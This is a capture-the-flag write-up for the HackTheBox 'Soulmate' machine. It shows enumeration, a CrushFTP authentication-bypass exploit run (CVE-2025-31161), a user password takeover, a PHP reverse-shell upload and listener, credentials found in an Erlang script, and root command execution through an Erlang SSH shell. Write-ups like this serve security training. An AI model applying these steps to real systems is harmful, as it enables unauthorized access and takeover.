# **Soulmate - HackTheBox**

*Target Ip. Address: 10.129.231.23*

So, Let's start with the nmap scan. 

```bash
kali@kali:nmap -sV -sC 10.129.231.23
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 08:31 +0545
Nmap scan report for 10.129.231.23
Host is up (0.76s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.19 seconds
```

Let's add soulmate.htb in the hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.231.23   soulmate.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see wht we have o the website.

Classic website but nothing that interesting to help us.

```bash
kali@kali:gobuster dir -u http://soulmate.htb/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soulmate.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 178] [--> http://soulmate.htb/assets/]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

Let's see if we get any subdomains for soulmate.htb.

```bash
kali@kali:ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 547ms]
:: Progress: [5000/5000] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

We have one hit. Let's add that to our hosts file

```bash
kali@kali:cat /etc/hosts
10.129.231.23   soulmate.htb ftp.soulmate.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see what we have there.

<img width="1262" height="902" alt="image" src="https://github.com/user-attachments/assets/fbf0b015-89c6-4a14-9da2-b4c863008f49" />

So, we have an instance of CrushFTP. Let's check if it have any exploits.

```bash
kali@kali:searchsploit crush ftp
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                                                             | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass                                                                                | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                              | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                                | multiple/remote/52012.py
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So, we will use tha auth-bypass, which is CVE-2025-31161.

```bash
kali@kali:python3 exploit_ftp.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user hack --password pass
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: hack
   [*] Password: pass.
```

Our admin user is created, let's login with the credentials we have.

<img width="1254" height="949" alt="image" src="https://github.com/user-attachments/assets/555b45fe-1544-48b9-8642-fa949feba283" />

We are logged in as admin. Let's see what we can do.

<img width="1251" height="940" alt="image" src="https://github.com/user-attachments/assets/f8f2a0e0-62f3-4e89-83b9-4f77d2881057" />

It seems I can chamge the passwords of the user. I will change the passowrd of user ben.

Logging as user ben, I can upload the files. I have uploaded a simple php reverse shell on webProd directory, which is root directory of soulmate.htb.

<img width="1256" height="852" alt="image" src="https://github.com/user-attachments/assets/799af016-f114-4d33-9603-127f10af55e3" />

Start a listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.18.0.1 • 172.17.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Let's run the php file. It will be available at soulmate.htb/rev.php.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.18.0.1 • 172.17.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from soulmate~10.129.231.23-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/soulmate~10.129.231.23-Linux-x86_64/2026_02_10-09_02_12-905.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@soulmate:/$ 
```

We get a shell as www-data.

```bash
                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-08-27+09:28:26.8565101180 /usr/local/sbin/laurel
2025-08-15+07:46:57.3585015320 /usr/local/lib/erlang_login/start.escript
2025-08-14+14:13:10.4708616270 /usr/local/sbin/erlang_login_wrapper
2025-08-14+14:12:12.0726103070 /usr/local/lib/erlang_login/login.escript
2025-08-06+10:44:17.9697674470 /usr/local/lib/erlang/bin/start_erl
2025-08-06+10:44:17.9537674200 /usr/local/lib/erlang/erts-15.2.5/bin/start
2025-08-06+10:44:17.9537674200 /usr/local/lib/erlang/bin/start
2025-08-06+10:44:17.9497674140 /usr/local/lib/erlang/erts-15.2.5/bin/erl
2025-08-06+10:44:17.9497674140 /usr/local/lib/erlang/bin/erl
2025-08-06+10:44:16.6617653190 /usr/local/lib/erlang/lib/diameter-2.4.1/bin/diameterc
```

From linpeas output, I see there is erlang running and some scripts, possibly can have credentials.

```bash
www-data@soulmate:/tmp$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "Ho...98"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

We find the ssh credentials of ben. Let's login as ben via ssh to get proper tty.

```bash
kali@kali:ssh ben@soulmate.htb
The authenticity of host 'soulmate.htb (10.129.231.23)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:35: [hashed name]
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
ben@soulmate.htb's password: 
Last login: Tue Feb 10 03:27:40 2026 from 10.10.16.26
ben@soulmate:~$
```

We are in as ben. We have our first flag in the home directory.

```bash
ben@soulmate:~$ cat user.txt
dd.....11
```

We had seen erlang ssh running, let's find it's port.

```bash
ben@soulmate:~$ ss -tulnp
Netid          State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process          
udp            UNCONN          0               0                        127.0.0.53%lo:53                           0.0.0.0:*                             
udp            UNCONN          0               0                              0.0.0.0:68                           0.0.0.0:*                             
tcp            LISTEN          0               4096                         127.0.0.1:9090                         0.0.0.0:*                             
tcp            LISTEN          0               4096                     127.0.0.53%lo:53                           0.0.0.0:*                             
tcp            LISTEN          0               5                            127.0.0.1:2222                         0.0.0.0:*                             
tcp            LISTEN          0               4096                         127.0.0.1:8443                         0.0.0.0:*                             
tcp            LISTEN          0               4096                         127.0.0.1:4369                         0.0.0.0:*                             
tcp            LISTEN          0               128                          127.0.0.1:39325                        0.0.0.0:*                             
tcp            LISTEN          0               4096                         127.0.0.1:42537                        0.0.0.0:*                             
tcp            LISTEN          0               4096                         127.0.0.1:8080                         0.0.0.0:*                             
tcp            LISTEN          0               128                            0.0.0.0:22                           0.0.0.0:*                             
tcp            LISTEN          0               511                            0.0.0.0:80                           0.0.0.0:*                             
tcp            LISTEN          0               4096                             [::1]:4369                            [::]:*                             
tcp            LISTEN          0               128                               [::]:22                              [::]:*                             
tcp            LISTEN          0               511                               [::]:80                              [::]:*
```

So, erlang SSH is running on port 2222. Let's ssh to it.

```bash
ben@soulmate:~$ ssh -p 2222 localhost
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

So, with ben's password we logged into erlang ssh.

```bash
(ssh_runner@soulmate)1> os:cmd("id").

"uid=0(root) gid=0(root) groups=0(root)\n"
(ssh_runner@soulmate)2>
```

We are running as root. Let's grab the final flag and end this challlenge.

```bash
(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").

"63.....85\n"
(ssh_runner@soulmate)3> 
```
